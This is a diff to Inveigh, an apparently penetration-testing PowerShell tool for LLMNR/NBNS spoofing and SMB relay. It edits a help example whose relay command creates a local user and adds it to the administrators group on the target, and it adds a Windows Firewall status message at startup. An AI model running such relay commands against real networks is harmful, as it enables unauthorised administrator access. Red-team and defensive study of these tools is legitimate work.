@@ -223,7 +223,7 @@ Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0;
 Execute specifying an HTTP redirect response.
 
 .EXAMPLE
-Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
+Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2016 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
 target.  
 
@@ -478,6 +478,14 @@ else
 # Write startup messages
 $inveigh.status_queue.Add("Inveigh started at $(Get-Date -format 's')")  > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh started")]) > $null
+
+$firewall_status = netsh advfirewall show allprofiles state | where {$_ -match 'ON'}
+
+if($firewall_status)
+{
+    $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null
+}
+
 $inveigh.status_queue.Add("Listening IP Address = $IP")  > $null
 $inveigh.status_queue.Add("LLMNR/NBNS Spoofer IP Address = $SpooferIP")  > $null
 
@@ -780,6 +788,12 @@ if($SMBRelay -eq 'N')
                 {
 
                     "Run Stop-Inveigh to stop Inveigh"
+                    {
+                        Write-Warning($inveigh.status_queue[0])
+                        $inveigh.status_queue.RemoveRange(0,1)
+                    }
+
+                    "Windows Firewall = Enabled"
                     {
                         Write-Warning($inveigh.status_queue[0])
                         $inveigh.status_queue.RemoveRange(0,1)
